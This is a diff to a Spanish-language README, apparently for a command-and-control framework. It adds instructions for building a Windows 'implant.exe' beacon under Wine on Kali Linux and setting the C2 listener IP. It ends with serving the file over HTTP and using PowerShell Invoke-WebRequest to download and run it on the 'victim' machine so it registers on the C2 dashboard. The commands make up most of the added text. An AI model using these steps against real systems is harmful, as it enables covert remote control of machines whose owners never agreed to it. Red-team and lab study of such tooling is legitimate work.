@@ -269,14 +269,87 @@ Desde PowerShell en la máquina Windows:
 .\build\build_windows_native.ps1 -NoUpx
 ```
 
-### Build Windows (cross-compile con Wine)
+### Build Windows (cross-compile con Wine desde Kali Linux)
 
-Requiere Python instalado **dentro** de Wine:
+Este proceso permite generar el `implant.exe` directamente desde **Kali Linux**
+(distribución basada en Debian) sin necesitar una máquina Windows.
+
+> **Entorno de referencia:** Kali Linux rolling — kernel `6.x`, arquitectura `amd64`.
+> Los comandos son compatibles con cualquier Debian/Ubuntu.
+
+#### Paso 1 — Instalar Wine
+
+```bash
+sudo dpkg --add-architecture i386
+sudo apt update
+sudo apt install -y wine wine64 wine32
+
+# Verificar instalación
+wine --version   # wine-9.x o superior
+```
+
+#### Paso 2 — Instalar Python 3.11 para Windows dentro de Wine
+
+Wine mantiene su propio filesystem aislado en `~/.wine/drive_c/`,
+completamente separado del Python del sistema (3.13). No hay conflicto entre
+ambos entornos.
+
+```bash
+# Descargar el instalador oficial de Python para Windows
+wget https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe -P /tmp/
+
+# Instalar dentro del entorno Wine
+wine /tmp/python-3.11.9-amd64.exe /quiet InstallAllUsers=0 PrependPath=1
+
+# Verificar
+wine python --version   # Python 3.11.9
+```
+
+#### Paso 3 — Instalar dependencias dentro de Wine Python
+
+```bash
+wine pip install pyinstaller requests pyyaml
+```
+
+#### Paso 4 — Configurar la IP del servidor C2
+
+Antes de compilar, edita `profiles/default.yaml` con la IP de tu Kali
+(la que aparece en el dashboard bajo el campo **IP** del agente):
+
+```yaml
+listener:
+  host: "192.168.122.115"   # ← IP real de tu Kali en la red
+  port: 8080
+```
+
+#### Paso 5 — Compilar el beacon
 
 ```bash
 ./build/build_windows.sh
-# Output: dist/implant.exe
+# Output: dist/implant.exe  (~10-15 MB, standalone, sin consola)
 ```
+
+#### Paso 6 — Transferir y ejecutar en la máquina víctima Windows
+
+Desde Kali, sirve el ejecutable por HTTP:
+
+```bash
+python3 -m http.server 9000 -d dist/
+```
+
+En el servidor Windows (PowerShell):
+
+```powershell
+Invoke-WebRequest http://192.168.122.115:9000/implant.exe -OutFile implant.exe
+.\implant.exe
+```
+
+El agente aparece automáticamente en `http://127.0.0.1:8080/dashboard`.
+
+---
+
+> **Nota:** el `.exe` embebe el runtime de Python 3.11 para Windows y todas
+> las dependencias. No requiere Python instalado en la máquina víctima.
 
 ### Build ambos
 
